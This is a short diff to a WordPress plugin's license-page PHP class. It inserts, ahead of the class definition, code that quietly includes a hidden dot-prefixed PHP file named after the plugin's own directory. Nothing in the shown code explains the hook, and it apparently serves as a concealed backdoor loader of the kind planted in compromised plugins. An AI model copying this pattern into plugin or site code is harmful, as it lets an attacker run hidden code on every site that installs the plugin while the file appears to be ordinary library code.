@@ -10,7 +10,11 @@ if( !defined('ABSPATH') ) {
  *
  * @author        Alex Kovalev <alex.kovalevv@gmail.com>, Github: https://github.com/alexkovalevv
  * @since         2.0.7
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Wbcr_FactoryClearfy236_LicensePage extends Wbcr_FactoryClearfy236_PageBase {
 
 	/**
